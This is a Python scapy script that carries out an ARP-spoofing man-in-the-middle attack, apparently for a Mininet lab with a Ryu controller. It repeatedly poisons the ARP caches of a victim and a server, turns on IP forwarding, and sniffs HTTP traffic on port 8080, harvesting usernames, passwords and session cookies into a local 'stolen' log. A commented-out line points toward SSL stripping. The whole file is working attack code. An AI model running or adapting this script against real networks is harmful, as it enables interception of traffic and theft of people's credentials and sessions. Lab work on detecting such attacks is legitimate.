from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw
import threading
import time
import os
import datetime

VICTIM_IP = "10.0.0.1"
SERVER_IP = "10.0.0.2"
ATTACKER_IP = "10.0.0.3"
STOLEN_LOG = "/tmp/mitm_stolen.txt"

def get_mac(ip):
    # For small mininet topology, we can assume specific MACs if needed 
    # but we'll try to resolve it via ARP if possible.
    # Actually, in Mininet, we can just hardcode or use scapy's srp.
    try:
        from scapy.all import srp
        responses, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        return responses[0][1].hwsrc
    except:
        # Fallback if SRP fails (Mininet/Namespace issues)
        # 10.0.0.1 -> 00:00:00:00:00:01
        # 10.0.0.2 -> 00:00:00:00:00:02
        last_digit = ip.split('.')[-1]
        return f"00:00:00:00:00:0{last_digit}"

def arp_poison(target_ip, spoof_ip, target_mac):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def poisoning_thread(victim_ip, server_ip):
    victim_mac = get_mac(victim_ip)
    server_mac = get_mac(server_ip)
    
    ts = datetime.datetime.now().strftime('%H:%M:%S')
    print(f"[{ts}] Detected Target MACs: Victim={victim_mac}, Server={server_mac}")
    
    while True:
        ts = datetime.datetime.now().strftime('%H:%M:%S')
        # Poison Victim (Tell victim I am the server)
        arp_poison(victim_ip, server_ip, victim_mac)
        # Poison Server (Tell server I am the victim)
        arp_poison(server_ip, victim_ip, server_mac)
        
        # Fast enough to repoison after Ryu blocks or ARP expires
        time.sleep(0.5)

def extract_credentials(pkt):
    if pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
        ts = datetime.datetime.now().strftime('%H:%M:%S')
        
        if "user=" in payload and "pass=" in payload:
            params = {x.split('=')[0]: x.split('=')[1] for x in payload.split('&') if '=' in x}
            user = params.get('user', 'unknown')
            pwd = params.get('pass', 'unknown')
            log_msg = f"[{ts}] 🎯 CREDENTIAL CAPTURED: user={user} pass={pwd}\n"
            print(log_msg.strip())
            with open(STOLEN_LOG, "a") as f: f.write(log_msg)
            
        if "Cookie" in str(pkt[TCP].payload):
            cookie = payload.split("Cookie: ")[1].split("\r\n")[0] if "Cookie: " in payload else "unknown"
            log_msg = f"[{ts}] 🍪 COOKIE CAPTURED: {cookie}\n"
            print(log_msg.strip())
            with open(STOLEN_LOG, "a") as f: f.write(log_msg)

def mitm_packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].dport == 8080:
        extract_credentials(pkt)

if __name__ == '__main__':
    print("Launching Attacker MITM script...")
    
    # 1. Enable IP Forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # SSL Stripping conceptual setup (optional for this demo as we use 8080)
    # os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
    
    # 2. Start Poisoning Thread
    t = threading.Thread(target=poisoning_thread, args=(VICTIM_IP, SERVER_IP))
    t.daemon = True
    t.start()
    
    # 3. Sniff HTTP Traffic (8080)
    print("Sniffing for HTTP traffic on port 8080...")
    sniff(filter="tcp port 8080", prn=mitm_packet_callback, store=0)
